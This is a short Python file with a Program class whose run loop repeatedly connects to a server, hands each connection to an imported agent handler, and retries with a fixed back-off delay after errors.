import time
from config import RECONNECT_DELAY
from connection import connect_to_server
from main_agent import handle_connection

class Program:
    def run(self):
        consecutive_errors = 0
        while True:
            try:
                conn = connect_to_server()
                consecutive_errors = 0
                handle_connection(conn)
                conn.close()
            except Exception as e:
                consecutive_errors += 1
                time.sleep(RECONNECT_DELAY * 2 if consecutive_errors >= 10 else RECONNECT_DELAY)
